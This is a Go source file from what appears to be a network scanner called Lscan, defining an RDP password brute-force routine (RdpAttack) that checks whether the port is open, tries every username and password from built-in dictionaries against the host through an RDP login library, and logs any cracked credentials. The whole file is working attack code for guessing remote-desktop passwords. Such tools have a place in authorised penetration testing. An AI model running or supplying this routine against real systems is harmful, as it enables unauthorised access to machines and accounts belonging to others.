package systemapp

import (
	lcc "Lscan/common/components"
	lccg "Lscan/common/components/grdp"
	"Lscan/common/components/logger"
	lc "Lscan/configs"
	"fmt"
	"strconv"
)

// RdpAttack RDP口令爆破函数
func RdpAttack(info *lc.HostInfo) {
	ip := info.ScanHost
	port, _ := strconv.Atoi(info.ScanPort) // 端口号字符串转成 int
	if lcc.PortCheck(ip, port, "[RDP]") {
		for _, user := range lc.UserDict["rdp"] {
			for _, pwd := range lc.Passwords {
				result := fmt.Sprintf("[RDP] Check... " + ip + " " + user + " " + pwd)
				logger.Verbose(result)
				res, err := rdpAuth(ip, user, pwd)
				if res == true && err == nil {
					result := fmt.Sprintf("[RDP] %s:%d Password cracked successfully! account number：%s password：%s ", ip, port, user, pwd)
					logger.Success(result)
					return
				}
			}
		}
		result := fmt.Sprintf("[RDP] %s:%d Password cracking failed,The password security is high!", ip, port)
		logger.Failed(result)
	} else {
		result := fmt.Sprintf("[RDP] %s:%d The service port is not open at present!", ip, port)
		logger.Warning(result)
	}
}

func rdpAuth(ip, username, password string) (result bool, err error) {
	err = lccg.Login(ip, "", username, password)
	if err == nil {
		result = true
		return result, err
	} else {
		result = false
	}

	return result, err
}
